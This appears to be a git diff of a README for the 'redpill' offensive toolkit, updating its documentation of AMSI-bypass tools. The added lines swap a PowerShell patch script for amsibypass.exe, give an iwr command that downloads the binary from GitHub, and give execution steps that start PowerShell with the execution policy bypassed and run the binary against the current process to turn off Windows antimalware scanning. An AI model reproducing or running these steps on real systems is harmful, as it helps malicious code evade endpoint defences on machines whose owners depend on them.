@@ -48,7 +48,7 @@ Disable-Amsi -DontDisableBlockLogging "true"
    
 |Cmdlet Name|Description|Privileges|Notes|
 |---|---|---|---|
-|[Invoke-Bypass](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Ams1-Bypass/Invoke-Bypass.ps1)|disable AMSI within current process + exec script through bypass?|User Land|4 bypass technics available (manual)|
+|Invoke-Bypass|disable AMSI within current process + exec script through bypass?|User Land|3 bypass technics available (manual)|
 
 <br />
 
@@ -103,33 +103,30 @@ amsiutils
 
 #Test detection
 amsiutils
-```   
+```
 
 <br />
 
-## patch-amsi-x64-powershell.ps1
+## amsibypass.exe
    
 |Cmdlet Name|Description|Privileges|Notes|
 |---|---|---|---|
-|[patch-amsi-x64-powershell](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Ams1-Bypass/patch-amsi-x64-powershell.ps1)|disable AMSI within current process|User Land|Available for x64 bytes only|
+|[amsibypass.exe](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Ams1-Bypass/amsibypass.exe)|Unchain AMSI by patching the provider’s unmonitored memory space|User Land|Available for x64 bytes only|
 
 <br />
 
 **downloadcmdLet:**
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/patch-amsi-x64-powershell.ps1" -OutFile "patch-amsi-x64-powershell.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/amsibypass.exe" -OutFile "amsibypass.exe"
 ```
 
 <br />
 
 **execute:**
 ```powershell
-#Test detection
-"amsiutils"
-
-#Patch amsi scan function
-.\patch-amsi-x64-powershell.ps1
+powershell -ep bypass -nop
+.\amsibypass.exe $pid
 
 #Test detection
-"amsiutils"
-```  
+amsiutils
+```      
